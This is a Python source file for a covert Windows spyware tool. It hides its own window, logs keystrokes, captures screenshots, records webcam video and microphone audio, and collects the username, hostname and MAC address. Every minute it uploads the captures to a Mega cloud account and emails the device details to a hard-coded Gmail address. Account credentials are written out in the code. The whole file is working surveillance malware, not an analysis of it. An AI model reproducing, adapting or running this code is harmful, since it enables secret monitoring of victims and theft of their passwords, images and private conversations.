from mega import Mega
import cv2
import os
import numpy as np
from scipy.io.wavfile import write
import sounddevice as sd
from threading import Thread
import getmac
from getmac import get_mac_address as gma
import platform
import socket
import getpass
import signal
from datetime import datetime, timedelta
from pynput.keyboard import Key, Controller, Listener
from pynput import mouse, keyboard
import sched
import time
import pyautogui
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import win32gui
import win32con


error = open("error.txt", 'a')
# ruun without console
# ---------------------
try:
    The_program_to_hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(The_program_to_hide, win32con.SW_HIDE)

    open("log.txt", 'a')

    chars = {
        '<96>': '0',
        '<97>': '1',
        '<98>': '2',
        '<99>': '3',
        '<100>': '4',
        '<101>': '5',
        '<102>': '6',
        '<103>': '7',
        '<104>': '8',
        '<105>': '9',
        '<110>': '.',
        '<65>': 'a',
        "'\x01'": 'a',
        "'\x13'": "s",
        "'\x04'": 'd',
        "<68>": 'd',
        "Key.space": " "

    }
    # get info of device
    # ------------------

    username = getpass.getuser()
    hostname = socket.gethostname()
    mac = str(gma()).replace(":", "-")
    mega = Mega()
    email = 'hassanmahmoud607@gmail.com'
    password = '0173584900'
    m = mega.login(email, password)
    print("loginDone")
    m.create_folder(hostname+mac)
    folder = m.find(hostname+mac)
    print("folder created")
except Exception:
    error.write("timeline :"+str(Exception))
    error.write("\n")

#


def take():
    try:
        print("enter take method")
        pic = pyautogui.screenshot()
        picName = str('screenshot'+str(time.asctime()
                                       ).replace(":", "-").replace(" ", "-")+'.png')
        smile = pic.save(picName)
        return picName
    except Exception:
        error.write("take :"+str(Exception))
        error.write("\n")


def uploadfiles():
    print("enter uploeadfiles method")
    try:
        file = m.upload('log.txt', folder[0])
        print("logs uploaded successfyly!")
    except Exception:
        error.write("logs uploade" + str(Exception))
        error.write("\n")

    try:
        file = m.upload(take(), folder[0])
        print("screen uploaded successfyly!")
    except Exception:
        error.write("screen uploade :" + str(Exception))
        error.write("\n")

    try:
        recAudio()
    except Exception:
        error.write("recAudio() : " + str(Exception))
        error.write("\n")

    try:
        file = m.upload('record.wav',  folder[0])
        print("record uploaded successfyly!")
    except Exception:
        error.write("record uploade :" + str(Exception))
        error.write("\n")

    try:
        file = m.upload('video.avi', folder[0])
        print("video uploaded successfyly!")
    except Exception:
        error.write("video uploade : " + str(Exception))
        error.write("\n")

    try:
        sendConfirmationMail(username, hostname, mac)
    except Exception:
        error.write("sendConfirmationMail : "+str(Exception))
        error.write("\n")


# uploadfiles()
# take screen shot
# ----------------


# send email method
# -----------------
def sendConfirmationMail(username, hostname, mac):
    try:
        print("prepare Email")

        sender_E = "hassanmahmoud607@gmail.com"
        passwd_E = "0173584900"
        recevi_E = "hassanmahmoud607@gmail.com"
        sub_E = username
        body_E = hostname+mac

        msg = MIMEMultipart()
        msg['From'] = sender_E
        msg['To'] = recevi_E
        msg['Subject'] = sub_E

        msg.attach(MIMEText(body_E, 'plain'))

        txt = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_E, passwd_E)
        print("Connection Done !")
        server.sendmail(sender_E, recevi_E, txt)
        print("email has been sent !")
    except Exception:
        error.write("sendConfirmationMail :"+str(Exception))
        error.write("\n")


s = sched.scheduler(time.time, time.sleep)


def timeline():
    try:
        print("shake yours ass !")
        uploadfiles()
        s.enter(60, 60, timeline)
        s.run()
    except Exception:
        error.write("timeline :"+str(Exception))
        error.write("\n")


def spy(key):
    try:
        data = str(key)
        print(data)

        with open("log.txt", 'a') as f:
            if data in chars.keys():
                f.writelines(chars.get(str(data), "notic"))
            else:
                if Key.caps_lock == 1 or Key.shift == 1:
                    key.upper(data)
                f.writelines(data)
            f.write("\n")
    except Exception:
        error.write("spy :"+str(Exception))
        error.write("\n")


def stat():
    try:
        print("enter keylogger method")
        with Listener(on_press=spy) as strok:
            strok.join()
    except Exception:
        error.write("timeline :"+str(Exception))
        error.write("\n")


def recVideo():
    try:
        print("start video")
        filename = 'video.avi'
        frames_per_second = 30.0
        res = '720p'

        def change_res(cap, width, height):
            cap.set(3, width)
            cap.set(4, height)

        STD_DIMENSIONS = {
            "480p": (640, 480),
            "720p": (1280, 720),
            "1080p": (1920, 1080),
            "4k": (3840, 2160),
        }

        def get_dims(cap, res='1080p'):
            width, height = STD_DIMENSIONS["480p"]
            if res in STD_DIMENSIONS:
                width, height = STD_DIMENSIONS[res]
            change_res(cap, width, height)
            return width, height

        VIDEO_TYPE = {
            'avi': cv2.VideoWriter_fourcc(*'XVID'),
            'mp4': cv2.VideoWriter_fourcc(*'XVID'),
        }

        def get_video_type(filename):
            filename, ext = os.path.splitext(filename)
            if ext in VIDEO_TYPE:
                return VIDEO_TYPE[ext]
            return VIDEO_TYPE['avi']

        cap = cv2.VideoCapture(0)

        print("start Record Video Now")
        out = cv2.VideoWriter(filename, get_video_type(
            filename), 30, get_dims(cap, res))
        st = datetime.now()
        while datetime.now() < st+timedelta(seconds=10):
            ret, frame = cap.read()
            out.write(frame)
            # cv2.imshow('frame', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cap.release()
        out.release()
        cv2.destroyAllWindows()
    except Exception:
        error.write("recVideo :" + str(Exception))
        error.write('\n')


def recAudio():
    try:
        print("start audio")
        fs = 44100  # Sample rate
        seconds = 10  # Duration of recording

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished
        print("Audio finished")
        write('record.wav', fs, myrecording)  # Save as WAV file
    except Exception:
        error.write("recAudio :"+str(Exception))
        error.write("\n")


if __name__ == '__main__':
    Thread(target=recVideo).start()
    Thread(target=stat).start()
    Thread(target=timeline).start()
